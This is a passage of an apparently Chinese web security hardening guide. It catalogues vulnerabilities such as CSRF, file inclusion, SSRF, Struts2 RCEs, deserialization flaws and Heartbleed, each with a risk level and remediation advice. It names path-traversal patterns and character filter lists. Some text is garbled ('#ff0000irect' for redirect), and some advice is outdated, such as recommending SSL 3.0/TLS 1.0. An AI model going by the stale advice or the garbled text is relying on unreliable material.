font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>通过构建URL，攻击者可以使用户重定向到任意URL，利用这个漏洞可以诱使用户访问某个页面，挂马、密码记录、下载任意文件等，常被用来钓鱼。<br><strong>加固建议：</strong><br>1.referer的限制<br>如果确定传递URL参数进入的来源，可以通过该方式实现安全限制，保证该URL的有效性，避免恶意用户自己生成跳转链接。<br>2.加入有效性验证Token<br>保证所有生成的链接都是来自于可信域的，通过在生成的链接里加入用户不可控的Token对生成的链接进行校验，可以避免用户生成自己的恶意链接从而被利用。<br>3.URL白名单，在白名单内才进行跳转</p><h2 id="Host头攻击漏洞"><a href="#Host头攻击漏洞" class="headerlink" title="Host头攻击漏洞"></a>Host头攻击漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>对开发人员来说，提取请求头中的Host参数写入当前页面是一个很不明智的选择。因为如果这样，攻击者就可以通过修改HTTP请求头中的Host字段，控制服务器返回页面中的URL。<br><strong>加固建议：</strong><br>不允许读取Host字段并写入页面。如有需要，应使用服务器脚本自带的SERVER_NAME变量。</p><h2 id="框架注入漏洞"><a href="#框架注入漏洞" class="headerlink" title="框架注入漏洞"></a>框架注入漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者有可能注入含有恶意内容的 frame 或 iframe 标签。如果用户不够谨慎，就有可能浏览该标签所对应的页面，但意识不到自己会离开原始站点而进入恶意的站点。之后，攻击者便可以诱导用户再次登录，然后获取其登录凭证。<br><strong>加固建议：</strong><br>建议过滤以下所有字符：| &amp; ； $ % @ ‘ “ &#39; &quot; &lt;&gt; () + CR LF , \。</p><h2 id="CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）"><a href="#CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）" class="headerlink" title="CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）"></a>CSRF跨站请求伪造漏洞（HTML表单没有CSRF保护）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>攻击者可利用该漏洞模仿合法用户，从而使攻击者能够以该用户身份查看或变更用户记录以及执行事务。<br><strong>加固建议：</strong><br>1.使用验证码<br>使用验证码，那么每次操作都需要用户进行互动，可简单有效的防御CSRF攻击。<br>2.检测referer<br>通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的<br>3.增加一个随机的token值<br>添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>验证上传文件的程序没有对上传文件作任何过滤，导致可以上传任意文件到服务器，甚至是病毒文件和木马文件。<br><strong>加固建议：</strong><br>对于上传的附件，验证程序要做严格验证，使用服务器端校验，而不能仅用前端javascript验证。<br>1.建议严格限制上传文件类型和上传文件名及后缀。<br>2.检查文件头和文件内容，对上传文件目录的运行权限进行严格限制。<br>3.及时排查、删除服务器木马文件。</p><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server将特定文件当成脚本执行，从而导致攻击者可获取一定的服务器权限；或直接读取系统文件，造成服务器敏感信息泄露。<br><strong>加固建议：</strong><br>针对文件包含漏洞，建议采用“白名单”的方式，限制允许包含的文件范围。</p><h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>服务器通过语言的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。<br><strong>加固建议：</strong><br>如果一定要动态包含文件，建议最好明确规定包含哪些文件，进行白名单比对。同时，也可以在包含函数中加入目录限制。</p><h2 id="SSRF（服务端请求伪造）"><a href="#SSRF（服务端请求伪造）" class="headerlink" title="SSRF（服务端请求伪造）"></a>SSRF（服务端请求伪造）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器，探测内网信息甚至内网入侵。<br><strong>加固建议：</strong><br>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。建议对url参数值做严格的限制。</p><h2 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>程序过滤不严，导致可以通过../../../等方式跳转到其他目录读取任意文件。<br><strong>加固建议：</strong><br>1.过滤”../”的特殊字符<br>2.限制读取文件的目录，不允许跨目录读取</p><h2 id="任意文件下载漏洞"><a href="#任意文件下载漏洞" class="headerlink" title="任意文件下载漏洞"></a>任意文件下载漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在正常下载链接的文件参数前加 ../../../../ 来跳出目录限制，下载系统文件等任意文件。该漏洞是由于后台代码未对下载路径做安全限制引起的。<br><strong>加固建议：</strong><br>针对任意文件下载漏洞，建议严格限制文件下载路径。</p><h2 id="Struts2-dev-mod命令执行漏洞"><a href="#Struts2-dev-mod命令执行漏洞" class="headerlink" title="Struts2 dev-mod命令执行漏洞"></a>Struts2 dev-mod命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站封装采用Apache Struts xwork作为网站应用框架，且devMode为打开状态。当这个设置开启时，Struts2会提供更多的日志和调试信息来帮助开发者更快速的开发。<br>然而在开发者模式下，将允许OGNL语句注入，攻击者可能利用此漏洞进行远程代码执行。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-005命令执行漏洞"><a href="#S2-005命令执行漏洞" class="headerlink" title="S2-005命令执行漏洞"></a>S2-005命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OGNL除其他功能外，还提供了广泛的表达评估功能。该漏洞允许恶意用户绕过构建在ParametersInterceptor中的“＃” - 使用保护，从而能够利用此漏洞进行远程代码执行。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-009命令执行漏洞"><a href="#S2-009命令执行漏洞" class="headerlink" title="S2-009命令执行漏洞"></a>S2-009命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OGNL除其他功能外，还提供广泛的表达评估功能。该漏洞允许恶意用户绕过构建到ParametersInterceptor中的所有保护（正则表达式模式，拒绝方法调用），从而能够在任何公开的字符串变量中注入恶意表达式以进一步评估。<br>S2-003和S2-005中已经解决了类似的行为，但事实证明，基于白名单可接受的参数名称所产生的修复只是部分地关闭了漏洞。<br>正则表达式在ParametersInterceptor中匹配top [‘foo’]（0）作为一个有效的表达式，OGNL把它视为（top [‘foo’]）（0）并且将’foo’动作参数的值作为OGNL表达式来计算。这使得恶意用户可以将任意的OGNL语句放入任何由操作暴露的字符串变量中，并将其作为OGNL表达式进行求值，并且由于OGNL语句在HTTP参数值中，攻击者可以使用黑名单字符（例如＃）禁用方法执行并执行任意方法绕过了ParametersInterceptor和OGNL库的保护。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-016命令执行漏洞"><a href="#S2-016命令执行漏洞" class="headerlink" title="S2-016命令执行漏洞"></a>S2-016命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在struts2中，DefaultActionMapper类支持以”action:”、”#ff0000irect:”、”#ff0000irectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-017URL跳转漏洞"><a href="#S2-017URL跳转漏洞" class="headerlink" title="S2-017URL跳转漏洞"></a>S2-017URL跳转漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在2.3.15.1之前的Struts 2中，“#ff0000irect：”或“#ff0000irectAction：”之后的信息可以很容易地被操纵，以重定向到任意位置。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-019命令执行漏洞"><a href="#S2-019命令执行漏洞" class="headerlink" title="S2-019命令执行漏洞"></a>S2-019命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2的操作映射机制支持特殊参数前缀操作，这可能会在表格底部附加引导信息，在映射 “action:” 前缀操作时存在安全绕过漏洞，可被攻击者利用绕过某些安全限制访问受限制功能。Struts2的Dynamic Method Invocation机制是默认开启的（仅提醒用户如果可能的情况下关闭此机制）这样就存在远程代码执行漏洞，攻击者可利用此漏洞在受影响应用上下文中执行任意代码。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-032命令执行漏洞"><a href="#S2-032命令执行漏洞" class="headerlink" title="S2-032命令执行漏洞"></a>S2-032命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>动态方法调用启用时，可能会传递一个恶意表达式，用于在服务器端执行任意代码。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-037命令执行漏洞"><a href="#S2-037命令执行漏洞" class="headerlink" title="S2-037命令执行漏洞"></a>S2-037命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2使用Rest插件之后，ActionMapping通过org.apache.struts2.rest.RestActionMapper.java类的publicActionMappinggetMapping(HttpServl etRequest request,ConfigurationManagerconfigManager)的方法获取的。其中，当请求url是如下的格式：actionName/id/methodName会获取methodName 作为ActionMapping的method属性。但method属性未做任何处理，同S2-032漏洞执行流程一致，都是将ActionMapping的属性设置到ActionProxy中，从ActionProxy中获取method属性带入到ognl表达式中执行，通过OGNL表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性并覆盖_memberAccess的方式进行绕过，进而可在受控制的服务器端执行任意代码。即攻击者在部署了REST插件的Struts 2服务器上均可利用该漏洞远程执行任意命令<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-045命令执行漏洞"><a href="#S2-045命令执行漏洞" class="headerlink" title="S2-045命令执行漏洞"></a>S2-045命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件时通过修改HTTP请求头中的 Content-Type 值来触发该漏洞，进而执行系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-046命令执行漏洞"><a href="#S2-046命令执行漏洞" class="headerlink" title="S2-046命令执行漏洞"></a>S2-046命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>使用 Jakarta 文件上传插件的 Struts，攻击者可在上传文件的大小（由 Content-Length 头指定）大于 Struts2 允许的最大大小（2GB），文件名内容构造恶意的 OGNL 来触发该漏洞，进而执行系统命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="S2-052命令执行漏洞"><a href="#S2-052命令执行漏洞" class="headerlink" title="S2-052命令执行漏洞"></a>S2-052命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="JDWP远程命令执行漏洞"><a href="#JDWP远程命令执行漏洞" class="headerlink" title="JDWP远程命令执行漏洞"></a>JDWP远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。当对外开启该协议的Java调试模式时，存在远程命令执行漏洞。允许攻击者远程执行代码，获得服务器权限。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="ElasticSearch命令执行漏洞"><a href="#ElasticSearch命令执行漏洞" class="headerlink" title="ElasticSearch命令执行漏洞"></a>ElasticSearch命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>该漏洞存在于一个名为ElasticSearch.yml的文件，在这个文件中存在一个配置项“script.disable_dynamic”，默认为“false”。此默认配置允许服务器动态执行用户发送的任意代码。黑客只需要通过一个URL地址向服务器传送一段代码，就可以创建和执行他们自己的程序。一旦黑客获得通过，他们在服务器上的操作将不受任何限制，包括窃取网站中的用户账号及密码等敏感信息，或者留下一个后门程序。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="Resin任意文件读取漏洞"><a href="#Resin任意文件读取漏洞" class="headerlink" title="Resin任意文件读取漏洞"></a>Resin任意文件读取漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>安装某些版本Resin服务器的网站存在可读取任意文件的漏洞，攻击者利用该漏洞可以读取网站服务器的任意文件内容。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="GNU-Bash远程命令执行"><a href="#GNU-Bash远程命令执行" class="headerlink" title="GNU Bash远程命令执行"></a>GNU Bash远程命令执行</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。<br><strong>加固建议：</strong><br>1.升级最新版本；<br>2.系统如果不再使用 ，请将其下线或用防火墙屏蔽。</p><h2 id="Unicode-转换漏洞"><a href="#Unicode-转换漏洞" class="headerlink" title="Unicode 转换漏洞"></a>Unicode 转换漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>在Unicode在转换时，由于超长字节序列和错误格式引起子序列的安全问题。通过特殊的编码格式绕过程序对恶意字符的检测，可以用在SQL注入、XSS等。<br><strong>加固建议：</strong><br>1.升级Unicode版本至官方最新稳定版本<a href="http://www.unicode.org/">http://www.unicode.org</a><br>2.Unicode转化UTF-8编码后，对转换后进行安全检测，对特殊字符过滤或进行安全编码后输出。</p><h2 id="检测到网站被黑痕迹"><a href="#检测到网站被黑痕迹" class="headerlink" title="检测到网站被黑痕迹"></a>检测到网站被黑痕迹</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站页面已被篡改或已有入侵痕迹。<br><strong>加固建议：</strong><br>清除网站木马，全面检测网站漏洞并及时修复。</p><h2 id="使用被弃用的SSL-2-0协议"><a href="#使用被弃用的SSL-2-0协议" class="headerlink" title="使用被弃用的SSL 2.0协议"></a>使用被弃用的SSL 2.0协议</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>网站https使用了SSL 2.0协议。该协议非常老旧且已被弃用。该协议存在大量已知的安全漏洞，比如DROWN漏洞等。<br><strong>加固建议：</strong><br>禁用SSL 2.0或者使用SSL 3.0 或TLS 1.0代替。</p><h2 id="OpenSSL远程内存泄露漏洞（心脏滴血漏洞）"><a href="#OpenSSL远程内存泄露漏洞（心脏滴血漏洞）" class="headerlink" title="OpenSSL远程内存泄露漏洞（心脏滴血漏洞）"></a>OpenSSL远程内存泄露漏洞（心脏滴血漏洞）</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>OpenSSL是一款开放源码的SSL实现，用来实现网络通信的高强度加密。漏洞与OpenSSL TLS/DTLS传输层安全协议heartbeat扩展组件(RFC6520)相关，因此漏洞又被称为“heartbleed bug”（中文名称：“心血”漏洞）。该漏洞无需任何特权信息或身份验证，就可以获得X.509证书的私钥、用户名与密码、cookies等信息，进一步可直接从服务提供商和用户通讯中窃取聊天工具消息、电子邮件以及重要的商业文档和通信等私密数据。<br><strong>加固建议：</strong><br>升级OpenSSL版本到最新的1.0.1g；使用-DOPENSSL_NO_HEARTBEATS参数重新编译低版本的OpenSSL以禁用Heartbleed模块。</p><h2 id="JBoss-Seam参数化EL表达式远程代码执行漏洞"><a href="#JBoss-Seam参数化EL表达式远程代码执行漏洞" class="headerlink" title="JBoss Seam参数化EL表达式远程代码执行漏洞"></a>JBoss Seam参数化EL表达式远程代码执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>JBoss Seam是一个Java EE5框架，把JSF与EJB3.0组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。<br>JBoss Seam处理某些参数化JBoss EL表达式的方式存在输入过滤漏洞（ CVE-2010-1871）。如果远程攻击者能够诱骗通过认证的JBoss Seam用户访问特制的网页，就可能导致执行任意代码<br><strong>加固建议：</strong><br>升级至4.3.0 EL4或以上更高的、确认已修复此漏洞的版本。参考链接：<a href="https://bugzilla./#ff0000hat.com/show_bug.cgi?id=615956">https://bugzilla.#ff0000hat.com/show_bug.cgi?id=615956</a></p><h2 id="Weblogic-Java反序列化远程命令执行漏洞"><a href="#Weblogic-Java反序列化远程命令执行漏洞" class="headerlink" title="Weblogic Java反序列化远程命令执行漏洞"></a>Weblogic Java反序列化远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Weblogic存在Java反序列化漏洞，攻击者可以远程执行系统命令，获得服务器权限。<br><strong>加固建议：</strong><br>及时升级官方补丁。</p><h2 id="JBoss反序列化漏洞"><a href="#JBoss反序列化漏洞" class="headerlink" title="JBoss反序列化漏洞"></a>JBoss反序列化漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>根源在CommonsCollections组件中对于集合的操作存在可以进行反射调用的方法,并且该方法在相关对象反序列化时并未进行任何校验，导致远程代码执行。利用漏洞，允许攻击者远程执行系统命令，获得服务器权限，导致服务器运行安全风险。<br><strong>加固建议：</strong><br>1.针对JBoss Java反序列化漏洞，建议更新jboss版本到最新版（<a href="http://www.jboss.org/%EF%BC%89%E6%88%96">http://www.jboss.org/）或</a> 更新官方补丁。<br>2.针对数据库帐号密码进行修改，要求密码长度8位数以上，密码复杂程度必须包含数字、大小写字母及特殊字符。<br>3.对服务器进行全面安全检查，及时排查、清除webshell等后门文件；及时修改数据库密码等。</p><h2 id="JBoss-JMXInvokerServlet远程命令执行漏洞"><a href="#JBoss-JMXInvokerServlet远程命令执行漏洞" class="headerlink" title="JBoss JMXInvokerServlet远程命令执行漏洞"></a>JBoss JMXInvokerServlet远程命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Jboss在默认安装的时候，会安装http-invoker.sar站点，当请求invoker/JMXInvokerServlet或invoker/EJBInvokerServlet会调用org.jboss.invocation.http.servlet.InvokerServlet.class处理请求。该类对GET请求和POST请求，统一调用processRequest函数处理，因此，攻击者需要自己构造一个jboss的类，并且将其序列化，然后将序列化的数据直接提交到存在漏洞站点的invoker/JMXInvokerServlet页面，恶意代码将会被执行。<br><strong>加固建议：</strong><br>建议删除或禁止访问/invoker/JMXInvokerServlet文件。</p><h2 id="Apache-ActiveMQ远程代码执行漏洞-CVE-2016-3088"><a href="#Apache-ActiveMQ远程代码执行漏洞-CVE-2016-3088" class="headerlink" title="Apache ActiveMQ远程代码执行漏洞 (CVE-2016-3088)"></a>Apache ActiveMQ远程代码执行漏洞 (CVE-2016-3088)</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。<br><strong>加固建议：</strong><br>1.ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。<br>2.通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能</p><h2 id="Apache-Tomcat示例目录漏洞"><a href="#Apache-Tomcat示例目录漏洞" class="headerlink" title="Apache Tomcat示例目录漏洞"></a>Apache Tomcat示例目录漏洞</h2><p><strong>风险级别：</strong><font color="#ff0000"  font-size="14px">高危</font><br><strong>漏洞描述：</strong><br>tomcat安装时默认的演示、文档页面，会造成信息泄露和XSS跨站脚本漏洞，攻击者可以创建、销毁或控制session。<br><strong>加固建议：</strong><br>删除相关功能演示页面。</p><h2 id="Tomcat版本过低漏洞"><a href="#Tomcat版本过低漏洞" class="headerlink" title="Tomcat版本过低漏洞"></a>Tomcat版本过低漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Tomcat由于版本过低存在安全漏洞。<br><strong>加固建议：</strong><br>升级Tomcat版本或及时打补丁。</p><h2 id="S2-053命令执行漏洞"><a href="#S2-053命令执行漏洞" class="headerlink" title="S2-053命令执行漏洞"></a>S2-053命令执行漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>Apache Struts2 Freemarker标签如果被错误的配置使用，将会导致RCE远程代码执行漏洞。<br><strong>加固建议：</strong><br>1.升级到Apache Struts版本2.5.12或2.3.34<br>2.使用只读属性来初始化value属性（仅限getter属性）<br>3.Freemarker标签内容不要通过Request方式获取 </p><h2 id="HPPT-sys远程代码执行漏洞（MS15-034）"><a href="#HPPT-sys远程代码执行漏洞（MS15-034）" class="headerlink" title="HPPT.sys远程代码执行漏洞（MS15-034）"></a>HPPT.sys远程代码执行漏洞（MS15-034）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。<br>影响以下版本操作系统的IIS服务器：Windows 7、Windows 8、Windows server 2008、Windows server 2012<br><strong>加固建议：</strong><br>用户安装微软官方修复补丁（3042553）。<br><a href="https://support.microsoft.com/zh-cn/kb/3042553">https://support.microsoft.com/zh-cn/kb/3042553</a></p><h2 id="WebDav文件上传-信息泄露漏洞"><a href="#WebDav文件上传-信息泄露漏洞" class="headerlink" title="WebDav文件上传/信息泄露漏洞"></a>WebDav文件上传/信息泄露漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。使应用程序可直接对Web Server文件进行读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。远程攻击者可能利用此漏洞非授权读写文件。<br><strong>加固建议：</strong><br>通常情况下网站不需要支持额外的方法，建议禁用WebDav服务，关闭PUT、MOVE、COPY等方法。</p><h2 id="slowhttp拒绝服务攻击"><a href="#slowhttp拒绝服务攻击" class="headerlink" title="slowhttp拒绝服务攻击"></a>slowhttp拒绝服务攻击</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>如果远程攻击者使用发包工具向Apache服务器发送了不完整的HTTP请 求，服务器会打开连接等待接受完整的头，但如果发包工具不再继续发送完整请求而是发送无效头的话，就会一直保持打开的连接。这种攻击所造成的影响很严重， 因为攻击者不需要发送很大的通讯就可以耗尽服务器上的可用连接。也就是说，即使低带宽的用户也可以攻击大流量的服务器。<br><strong>加固建议：</strong><br>1.升级到最新版的apache<br>2.在httpd.conf中添加RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500<br>3.直接在 iptables 中限制每个 IP 的连接数可以解决以上绝大部分问题，除非攻击者拥有众多肉鸡，否则单 IP 的攻击将失去效果。<br>iptables -A INPUT -p tcp –syn –dport 8889 -m connlimit –connlimit-above 20 -j REJECT –reject-with tcp-reset</p><h2 id="jQuery版本过低（jQuery低版本存在跨站）"><a href="#jQuery版本过低（jQuery低版本存在跨站）" class="headerlink" title="jQuery版本过低（jQuery低版本存在跨站）"></a>jQuery版本过低（jQuery低版本存在跨站）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>jQuery 1.6.3之前版本中存在跨站脚本漏洞。当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。<br><strong>加固建议：</strong><br>升级jQuery版本。</p><h2 id="不安全的javascript库文件"><a href="#不安全的javascript库文件" class="headerlink" title="不安全的javascript库文件"></a>不安全的javascript库文件</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>该版本的javascript库存在多个安全漏洞<br><strong>加固建议：</strong><br>升级javascript库版本。</p><h2 id="传输层保护不足漏洞"><a href="#传输层保护不足漏洞" class="headerlink" title="传输层保护不足漏洞"></a>传输层保护不足漏洞</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>传输层保护不足，会暴露传输的数据，导致数据被窃听，账号被盗等，如果是管理员的账号面临这个问题，那么将会导致整个网站处于数据暴露的状态，将对网站和用户造成严重的甚至无法挽回的损失。<br><strong>加固建议：</strong><br>1.对所有敏感的页面使用SSL，非SSL请求的页面应该被重定向到SSL请求的页面。<br>2.对所有敏感的Cookie，设置“secure”的flag。<br>3.保证SSL的提供商只支持强大的算法，这样就不能够被轻易破解。（使用标准的强算法）<br>4.确保您的证书是有效的，不过期，不被撤销，并匹配这个网站使用的所有域。<br>5.后台和其他的连接也应该使用SSL或其他加密技术。<br>6.即使是开发者的注释也应该很好的被保护，防止信息泄露。</p><h2 id="服务器启用了TRACE-Method方法"><a href="#服务器启用了TRACE-Method方法" class="headerlink" title="服务器启用了TRACE Method方法"></a>服务器启用了TRACE Method方法</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong></p><ol><li>恶意攻击者可以通过TRACE Method返回的信息了解到网站前端的一些信息，如缓存服务器等，从而为下一步的攻击提供便利。</li><li>恶意攻击者可以通过TRACE Method进行XSS攻击</li><li>即使网站对关键页面启用了HttpOnly头标记和禁止脚本读取cookie信息，那么通过TRACE Method恶意攻击者还是可以绕过这个限制读取到cookie信息。</li></ol><p>  <strong>加固建议：</strong><br>  禁用TRACE方法。</p><h2 id="点击劫持漏洞（X-Frame-Options头缺失）"><a href="#点击劫持漏洞（X-Frame-Options头缺失）" class="headerlink" title="点击劫持漏洞（X-Frame-Options头缺失）"></a>点击劫持漏洞（X-Frame-Options头缺失）</h2><p><strong>风险级别：</strong><font color="#ffc000"  font-size="14px">中危</font><br><strong>漏洞描述：</strong><br>通过覆盖不可见的框架误导受害者点击，受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。<br><strong>加固建议：</strong><br>设置X-Frame-Options值来防御利用iframe嵌套的点击劫持攻击。</p><h2 id="启用了不安全的HTTP方法（启用了OPTIONS方法）"><a href="#启用了不安全的HTTP方法（启用了OPTIONS方法）" class="headerlink" 